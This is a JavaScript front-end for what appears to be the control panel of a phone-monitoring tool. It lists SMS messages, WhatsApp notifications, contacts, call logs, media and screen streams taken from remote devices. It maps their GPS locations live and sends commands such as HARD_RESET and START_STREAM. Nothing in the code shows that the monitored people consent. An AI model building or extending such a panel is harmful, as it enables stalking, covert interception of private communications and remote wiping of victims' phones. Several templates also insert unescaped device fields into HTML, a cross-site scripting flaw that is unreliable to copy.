// public/main.js - atualizado com mapa, socket, icons, downloads, hard reset, calls, streaming
const API_BASE = '/api';
const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';

function setLoggedIn(user, token) {
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
}
function logout() { localStorage.removeItem(tokenKey); localStorage.removeItem(userKey); location.reload(); }
function getToken() { return localStorage.getItem(tokenKey); }
function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }

const api = {
  post: async (path, body, token) => {
    const res = await fetch(API_BASE + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...(token?{ Authorization: 'Bearer ' + token }: {}) },
      body: JSON.stringify(body)
    });
    return res.json();
  },
  get: async (path, token) => {
    const res = await fetch(API_BASE + path, {
      headers: { ...(token?{ Authorization: 'Bearer ' + token }: {}) }
    });
    if (!res.ok) {
      console.error('GET error', path, res.status, await res.text());
      return [];
    }
    return res.json();
  },
  download: async (path, token) => {
    const res = await fetch(API_BASE + path, { headers: { Authorization: 'Bearer ' + token }});
    if (!res.ok) {
      const txt = await res.text().catch(()=>'<no body>');
      console.error('download failed', path, res.status, txt);
      throw new Error('download failed: ' + res.status);
    }
    return res.blob();
  }
};

document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/auth/login', { username: u, password: p });
  if (r.token) { setLoggedIn(r.user, r.token); showDashboard(); } else { document.getElementById('loginMsg').innerText = r.error || 'Login failed'; }
});
document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/auth/register', { username: u, password: p });
  document.getElementById('loginMsg').innerText = r.ok ? 'Registered, login' : (r.error || 'Register failed');
});
document.getElementById('btnLogout').addEventListener('click', logout);

function hideAllSections() {
  const ids = ['map','devicesSection','contactsSection','messagesSection','notifsSection','mediaSection','callsSection','historySection'];
  ids.forEach(id => { const el = document.getElementById(id); if (el) el.classList.add('hidden'); });
}
function showSection(id) {
  // hide map div when not requested
  const mapDiv = document.getElementById('map');
  if (id !== 'historySection') {
    if (mapDiv) mapDiv.style.display = 'none';
  }
  hideAllSections();
  const visible = document.getElementById(id);
  if (visible) visible.classList.remove('hidden');

  if (id === 'historySection') {
    // show and init map
    if (mapDiv) {
      mapDiv.style.display = 'block';
      setTimeout(()=> { if (map) map.invalidateSize(); }, 200);
    }
    initMapIfNeeded();
  }
}

document.getElementById('iconDevices').addEventListener('click', ()=> { showSection('devicesSection'); loadDevices(); });
document.getElementById('iconMessages').addEventListener('click', ()=> { showSection('messagesSection'); loadSms(); });
document.getElementById('iconNotifs').addEventListener('click', ()=> { showSection('notifsSection'); loadNotifs(); });
document.getElementById('iconContacts').addEventListener('click', ()=> { showSection('contactsSection'); loadContacts(); });
document.getElementById('iconMedia').addEventListener('click', ()=> { showSection('mediaSection'); loadMedia(); });
document.getElementById('iconMap').addEventListener('click', ()=> { showSection('historySection'); });

let socket = null;
let map = null;
let polyline = null;
let pathCoords = [];

async function initSocket() {
  if (socket) return;
  const token = getToken();
  if (!token) return;
  socket = io('/', { query: { token } });

  socket.on('connect', () => { console.log('socket connected'); });
  socket.on('location:new', (loc) => {
    console.log('location:new', loc);
    if (map) {
      addLocationToMap(loc);
    }
    prependHistoryItem(loc);
  });
  socket.on('media:new', (m) => {
    console.log('media:new', m);
    loadMedia(); // refresh media list (or append)
  });
  socket.on('disconnect', ()=> console.log('socket disconnected'));
}

function initMapIfNeeded() {
  if (map) return;
  const mapDiv = document.getElementById('map');
  mapDiv.style.display = 'block';
  map = L.map('map').setView([0,0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
  polyline = L.polyline([], { color: 'blue' }).addTo(map);
  loadLocationsToMap();
  initSocket();
}

async function loadLocationsToMap() {
  const token = getToken(); if (!token) return;
  const locs = await api.get('/location', token);
  pathCoords = [];
  if (!Array.isArray(locs)) return;
  // remove existing layers except tile layer
  // For simplicity reload map markers and polyline.
  locs.forEach(l => {
    const lat = parseFloat(l.lat), lon = parseFloat(l.lon);
    if (isNaN(lat) || isNaN(lon)) return;
    pathCoords.push([lat, lon]);
    const mk = L.marker([lat, lon]).addTo(map);
    mk.bindPopup(`<b>${l.deviceId}</b><br/>${lat.toFixed(5)},${lon.toFixed(5)}<br/>${new Date(l.timestamp).toLocaleString()}<br/><a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}">Navegar</a>`);
  });
  if (pathCoords.length) {
    polyline.setLatLngs(pathCoords);
    map.fitBounds(polyline.getBounds(), { padding: [50,50] });
  }
}

function addLocationToMap(loc) {
  try {
    const lat = parseFloat(loc.lat), lon = parseFloat(loc.lon);
    if (isNaN(lat) || isNaN(lon)) return;
    const mk = L.marker([lat, lon]).addTo(map);
    mk.bindPopup(`<b>${loc.deviceId}</b><br/>${lat.toFixed(5)},${lon.toFixed(5)}<br/>${new Date(loc.timestamp).toLocaleString()}<br/><a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}">Navegar</a>`);
    pathCoords.push([lat, lon]);
    polyline.setLatLngs(pathCoords);
  } catch (e) { console.error(e); }
}

function prependHistoryItem(loc) {
  const el = document.getElementById('historyList');
  if (!el) return;
  const li = document.createElement('div');
  li.innerHTML = `<b>${loc.deviceId}</b> ${new Date(loc.timestamp).toLocaleString()} — ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)} <a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${loc.lat},${loc.lon}">Navegar</a>`;
  el.prepend(li);
}

async function loadDevices() {
  const token = getToken(); if (!token) return;
  const devs = await api.get('/devices', token);
  const box = document.getElementById('devicesList');
  box.innerHTML = '';
  devs.forEach(d => {
    const el = document.createElement('div');
    const online = d.lastSeen && (Date.now() - new Date(d.lastSeen)) < 120000;
    el.innerHTML = `<strong>${d.label || d.deviceId}</strong> <span class="status-dot" style="color:${online?'green':'red'}">${online?'●':'●'}</span> <br/>LastSeen: ${d.lastSeen ? new Date(d.lastSeen).toLocaleString() : 'never'} <br/>
      <button onclick="sendCmd('${d.deviceId}','HARD_RESET')">Hard Reset</button>
      <button onclick="sendCmd('${d.deviceId}','START_STREAM')">Start Stream</button>
      <button onclick="sendCmd('${d.deviceId}','STOP_STREAM')">Stop Stream</button>
    `;
    box.appendChild(el);
  });
}

async function sendCmd(deviceId, command) {
  const token = getToken();
  if (!token) return alert('Not authenticated');
  const body = { command, params: {} };
  const res = await api.post('/device/' + encodeURIComponent(deviceId) + '/command', body, token);
  if (res && res.ok) alert('Command sent'); else alert('Command failed: ' + (res.error || 'unknown'));
}

async function loadContacts() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/contacts', token);
  const list = document.getElementById('contactsList'); list.innerHTML = '';
  if (!arr || arr.length === 0) list.innerHTML = '<li>Sem contactos</li>';
  arr.forEach(c => { const li = document.createElement('li'); li.textContent = `${c.name} — ${c.number}`; list.appendChild(li); });
}

async function loadSms() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/sms', token);
  const list = document.getElementById('smsList'); list.innerHTML = '';
  arr.forEach(s => { const li = document.createElement('li'); li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`; list.appendChild(li); });
}

async function loadNotifs() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/whatsapp', token);
  const list = document.getElementById('notifList'); list.innerHTML = '';
  arr.forEach(n => { const li = document.createElement('li'); li.textContent = `${n.sender}: ${n.message} (${new Date(n.timestamp).toLocaleString()})`; list.appendChild(li); });
}

async function loadCalls() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/call', token);
  const list = document.getElementById('callsList'); list.innerHTML = '';
  arr.forEach(c => {
    const li = document.createElement('li');
    li.textContent = `${c.number || 'unknown'} — ${c.state} (${c.duration || 0} ms) (${new Date(c.timestamp).toLocaleString()})`;
    list.appendChild(li);
  });
}

async function loadMedia() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/media', token);
  const list = document.getElementById('mediaList'); list.innerHTML = '';
  arr.forEach(m => {
    const li = document.createElement('li');
    const btn = document.createElement('button');
    btn.textContent = 'Ver/Download';
    btn.onclick = async () => {
      try {
        const blob = await api.download('/media/' + m._id, token);
        if (m.type === 'screen_stream' || (m.contentType && m.contentType.startsWith('video'))) {
          const url = URL.createObjectURL(blob);
          const player = document.getElementById('mediaPlayer');
          player.innerHTML = `<video controls autoplay src="${url}" style="max-width:100%;height:auto"></video>`;
        } else {
          const url = URL.createObjectURL(blob);
          const a = document.createElement('a'); a.href = url; a.download = m.filename || 'file'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
        }
      } catch (e) {
        console.error('download failed', e);
        alert('Download failed. Veja console para detalhes.');
      }
    };
    li.appendChild(document.createTextNode(`${m.filename || m._id} [${m.type || m.contentType}] `));
    li.appendChild(btn);
    list.appendChild(li);
  });
}

async function loadLocationsList() {
  const token = getToken();
  if (!token) return;
  const arr = await api.get('/location', token);
  const el = document.getElementById('historyList'); if (!el) return;
  el.innerHTML = '';
  arr.forEach(l => { const div = document.createElement('div'); div.innerHTML = `${new Date(l.timestamp).toLocaleString()} — ${l.lat.toFixed(5)},${l.lon.toFixed(5)} <a target="_blank" href="https://www.google.com/maps/dir/?api=1&destination=${l.lat},${l.lon}">Navegar</a>`; el.appendChild(div); });
}

async function render() {
  const token = getToken();
  if (!token) return;
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  const user = getUser();
  document.getElementById('userInfo').innerText = user ? user.username : '';
  await initSocket();
  await loadDevices();
  await loadContacts();
  await loadSms();
  await loadNotifs();
  await loadCalls();
  await loadMedia();
  await loadLocationsList();
}

function showDashboard() {
  showSection('devicesSection');
  render();
  // keep polling for devices/media/...
  setInterval(() => { loadDevices(); loadMedia(); loadSms(); loadNotifs(); loadCalls(); }, 8000);
}

window.addEventListener('load', () => {
  if (getToken()) showDashboard();
});
